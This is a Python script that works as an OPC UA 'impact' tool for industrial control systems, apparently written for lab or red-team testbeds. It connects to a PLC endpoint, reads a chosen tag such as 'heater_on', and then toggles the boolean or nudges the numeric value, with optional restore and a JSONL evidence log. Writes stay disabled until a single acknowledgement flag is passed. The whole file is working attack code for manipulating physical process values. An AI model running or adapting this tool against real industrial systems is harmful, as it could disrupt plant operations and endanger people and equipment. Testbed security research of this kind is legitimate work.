#!/usr/bin/env python3
# opcua_overwriter.py
#
# Safe-by-default OPC UA “impact” tool for a lab/testbed:
# - Connects (secure or insecure), authenticates (anonymous|username|x509)
# - Reads a target node’s type/value
# - If boolean: pulses to the opposite value for --pulseMs, then restores (optional)
# - If numeric: nudges by --nudgeAbs (absolute units) OR --nudge (fraction), holds, then restores (optional)
# - Logs every step to a JSONL evidence file
#
# IMPORTANT: This script is DRY-RUN by default. Use --i-understand-this-will-write to enable writes.

import argparse
import json
import sys
import time
from datetime import datetime

try:
    from opcua import Client, ua
except Exception as e:
    print(f"[!] Failed to import python-opcua: {e}", file=sys.stderr)
    sys.exit(1)

def ts():
    return datetime.utcnow().isoformat() + "Z"

def log_evidence(evidence_file, event, **kv):
    if not evidence_file:
        return
    rec = {"t": ts(), "event": event}
    rec.update(kv)
    with open(evidence_file, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec) + "\n")

def detect_variant_type(dv):
    """Return (variant_type_enum, py_value) for a DataValue; variant_type_enum can be None if dv has no Variant."""
    if dv is None or dv.Value is None:
        return (None, None)
    v = dv.Value  # ua.Variant
    return (v.VariantType, v.Value)

def as_same_variant(py_val, variant_type):
    """Coerce a Python value to a Variant of the same type as 'variant_type'."""
    if variant_type is None:
        return ua.Variant(py_val)  # best effort
    return ua.Variant(py_val, variant_type)

def set_security(client, policy, mode, client_cert, client_key, server_cert):
    """
    Try to configure secure channel on a wide range of python-opcua versions.
    Many versions accept CSV: "Policy,Mode[,client_cert,client_key[,server_cert]]"
    """
    if policy == "None" or mode == "None":
        return  # no channel security

    csv = f"{policy},{mode}"
    if client_cert and client_key:
        csv += f",{client_cert},{client_key}"
        if server_cert:
            csv += f",{server_cert}"

    # Newer versions accept CSV; older sometimes require separate loads.
    try:
        client.set_security_string(csv)
        return
    except TypeError:
        # Fallback: set policy/mode without files; then load files.
        client.set_security_string(f"{policy},{mode}")
        if client_cert:
            client.load_client_certificate(client_cert)
        if client_key:
            client.load_private_key(client_key)
        # server_cert pinning may not be supported; OK to ignore.

def set_identity(client, user, password, x509_user_cert, x509_user_key):
    """
    Configure user identity:
      - x509: client.set_user_certificate(cert, key)
      - username: client.set_user(user, password)
      - else: anonymous
    """
    if x509_user_cert and x509_user_key:
        try:
            client.set_user_certificate(x509_user_cert, x509_user_key)
            return "x509-user"
        except Exception as e:
            print(f"[!] x509 identity setup failed: {e}", file=sys.stderr)
            return "anonymous"
    if user:
        client.set_user(user)
        if password:
            client.set_password(password)
        return "user"
    return "anonymous"

def main():
    ap = argparse.ArgumentParser(description="OPC UA tag overwriter (lab/testbed). DRY-RUN by default.")
    ap.add_argument("--endpoint", "-e", default="opc.tcp://plc:4840", help="opc.tcp://HOST:PORT")
    # Channel security (defaults keep you safe if cryptography isn't installed)
    ap.add_argument("--policy", default="None", choices=[
        "None",
        "Basic256Sha256",
        "Aes128_Sha256_RsaOaep",
        "Aes256_Sha256_RsaPss",
    ], help="SecurityPolicy URI tail (use None to disable channel security).")
    ap.add_argument("--mode", default="None", choices=["None", "Sign", "SignAndEncrypt"], help="MessageSecurityMode.")
    ap.add_argument("--clientCert", help="Client application cert (PEM) for secure channel (not user auth).")
    ap.add_argument("--clientKey", help="Client application key (PEM) for secure channel (not user auth).")
    ap.add_argument("--serverCert", help="Server certificate (PEM/DER) to pin (optional).")

    # Identity
    ap.add_argument("--user", default="", help="Username (omit => anonymous).")
    ap.add_argument("--pass", dest="password", default="", help="Password.")
    ap.add_argument("--x509UserCert", help="User certificate (PEM) for x509 user identity.")
    ap.add_argument("--x509UserKey", help="User private key (PEM) for x509 user identity.")

    # Target + action
    ap.add_argument("--node", required=True, help="Target NodeId string, e.g., 'ns=1;s=heater_on'")
    ap.add_argument("--pulseMs", type=int, default=1000, help="For booleans: pulse duration in ms.")
    ap.add_argument("--nudgeAbs", type=float, default=None, help="For numerics: absolute nudge (units of the tag).")
    ap.add_argument("--nudge", type=float, default=None, help="For numerics: fractional nudge of current value (e.g., 0.02 = +2%).")
    ap.add_argument("--hold", type=float, default=0.0, help="Seconds to hold changed value before restore.")
    ap.add_argument("--restore", action="store_true", help="Restore original value after pulse/hold.")

    # Safety & logging
    ap.add_argument("--dryRun", action="store_true", help="Discover + log only; never write.")
    ap.add_argument("--i-understand-this-will-write", dest="im_sure", action="store_true",
                    help="Acknowledge writes will be sent (disables dry-run).")
    ap.add_argument("--evidence", default="", help="Path to JSONL evidence log.")
    args = ap.parse_args()

    will_write = (not args.dryRun) and args.im_sure
    if not will_write:
        print("[i] DRY-RUN mode (no writes). Use --i-understand-this-will-write to enable writes.")

    # Connect
    client = Client(args.endpoint)
    # Some versions use 'endpoint_must_exist'; newer prefer 'endpointMustExist'
    try:
        client.application_uri = "urn:lab:ICS-Testbed-Overwriter"
        client.application_name = "ICS-Testbed-Overwriter"
        # best-effort: avoid strict endpoint match
        client.endpoint_must_exist = False
    except Exception:
        pass

    try:
        set_security(client, args.policy, args.mode, args.clientCert, args.clientKey, args.serverCert)
        ident = set_identity(client, args.user, args.password, args.x509UserCert, args.x509UserKey)
        print(f"[+] Connecting ({args.policy}/{args.mode}) to {args.endpoint} as {ident} ...")
        log_evidence(args.evidence, "connect", endpoint=args.endpoint, policy=args.policy, mode=args.mode, identity=ident)
        client.connect()
        session = client
        log_evidence(args.evidence, "session", created=True)

        node = client.get_node(args.node)
        dv = node.get_data_value()
        vtype, cur = detect_variant_type(dv)
        print(f"[i] Target: {args.node}  DataType={vtype}  cur={cur}")
        log_evidence(args.evidence, "inspect", nodeId=args.node, variantType=str(vtype), currentValue=cur)

        # Decide action by type
        if vtype == ua.VariantType.Boolean:
            new_val = not bool(cur)
            if not will_write:
                print(f"[dryrun] Would pulse Boolean {cur} -> {new_val} for {args.pulseMs} ms; restore={args.restore}")
                log_evidence(args.evidence, "plan_boolean", nodeId=args.node, fromVal=cur, toVal=new_val,
                             pulseMs=args.pulseMs, restore=args.restore)
            else:
                try:
                    # Write opposite
                    dv_new = ua.DataValue(as_same_variant(new_val, ua.VariantType.Boolean))
                    node.set_value(dv_new)
                    log_evidence(args.evidence, "write", nodeId=args.node, value=new_val, status="sent")
                    print(f"[i] Boolean write -> {new_val}: sent")
                    time.sleep(max(0, args.pulseMs) / 1000.0)
                    # Restore or leave toggled
                    if args.restore:
                        dv_old = ua.DataValue(as_same_variant(bool(cur), ua.VariantType.Boolean))
                        node.set_value(dv_old)
                        log_evidence(args.evidence, "restore", nodeId=args.node, value=bool(cur), status="sent")
                        print(f"[i] Restored boolean -> {bool(cur)}")
                except ua.UaStatusCodeError as se:
                    print(f"[!] Boolean write failed: {se}", file=sys.stderr)
                    log_evidence(args.evidence, "error", op="boolean_write", code=str(se))
        else:
            # Numeric-ish path
            if args.nudgeAbs is None and args.nudge is None:
                print("[!] Provide --nudgeAbs (absolute units) or --nudge (fraction of current). Nothing done.")
                log_evidence(args.evidence, "noop", reason="no_nudge_specified")
            else:
                try:
                    cur_num = float(cur)
                except Exception:
                    print(f"[!] Target value is not numeric (cur={cur}). Nothing done.", file=sys.stderr)
                    log_evidence(args.evidence, "noop", reason="non_numeric")
                    session.disconnect()
                    return

                delta = 0.0
                if args.nudgeAbs is not None:
                    delta = args.nudgeAbs
                else:
                    # Fractional nudge of *current* value
                    delta = cur_num * float(args.nudge)

                new_val_num = cur_num + delta
                if not will_write:
                    print(f"[dryrun] Would nudge numeric {cur_num} by {delta} -> {new_val_num}; hold={args.hold}s; restore={args.restore}")
                    log_evidence(args.evidence, "plan_numeric", nodeId=args.node,
                                 fromVal=cur_num, delta=delta, toVal=new_val_num,
                                 hold=args.hold, restore=args.restore)
                else:
                    try:
                        dv_new = ua.DataValue(as_same_variant(new_val_num, vtype))
                        node.set_value(dv_new)
                        log_evidence(args.evidence, "write", nodeId=args.node, value=new_val_num, status="sent")
                        print(f"[i] Numeric write -> {new_val_num}: sent")
                        if args.hold > 0:
                            time.sleep(args.hold)
                        if args.restore:
                            dv_old = ua.DataValue(as_same_variant(cur, vtype))
                            node.set_value(dv_old)
                            log_evidence(args.evidence, "restore", nodeId=args.node, value=cur, status="sent")
                            print(f"[i] Restored numeric -> {cur}")
                    except ua.UaStatusCodeError as se:
                        print(f"[!] Numeric write failed: {se}", file=sys.stderr)
                        log_evidence(args.evidence, "error", op="numeric_write", code=str(se))

        print("[+] Done.")
    except ua.UaError as e:
        print(f"[!] OPC UA error: {e}", file=sys.stderr)
        log_evidence(args.evidence, "error", op="opcua", msg=str(e))
        sys.exit(2)
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        log_evidence(args.evidence, "error", op="generic", msg=str(e))
        sys.exit(3)
    finally:
        try:
            client.disconnect()
        except Exception:
            pass

if __name__ == "__main__":
    main()
